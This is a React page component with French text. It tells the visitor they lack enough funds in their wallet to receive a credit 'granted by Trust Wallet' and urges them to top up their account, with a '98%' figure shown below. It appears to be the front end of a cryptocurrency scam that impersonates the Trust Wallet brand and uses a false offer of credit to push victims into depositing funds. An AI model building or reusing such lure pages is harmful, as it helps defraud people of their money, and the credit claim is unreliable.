import { FaStar } from 'react-icons/fa'
import React , {useState ,useEffect} from 'react'
import Layout from './layout'

const Home = () => {
  useEffect(() => {
  window.scrollTo(0, 0)
}, [])

  return (
      <Layout>
            <div className = 'content background-colorBlack'>

                  <div className = 'content-login content-login-warning'>
                      <div className = 'content-warning'>
                            <div className = 'content-warning-center'>
                                <p className = 'content-warning-titlr'>Oups! vous n'avez pas assez de fonds dans votre wallet pour bénéficier du crédit. </p>
                                <p className = 'content-warning-txt'>Pour bénéficier du crédit offert par trust Wallet veuillez recharger votre compte. </p>
                            </div>
                      </div>
                  </div>

                  <div className = 'content-get-credit'>
                     <div className = 'content-get-credit-title'>Crédit octroyé par trust wallet</div>

                     <div className = 'content-get-credit-zn'>
                        <div className = 'content-get-credit-animated'>
                             <div className = "content-get-credit-animated-left" ><span>portefeuilles </span></div>
                             <div className = "content-get-credit-animated-right" ><span>98% </span></div>
                        </div>
                     </div>

                  </div>

                  




            </div>
      </Layout>
  )
}

export default Home
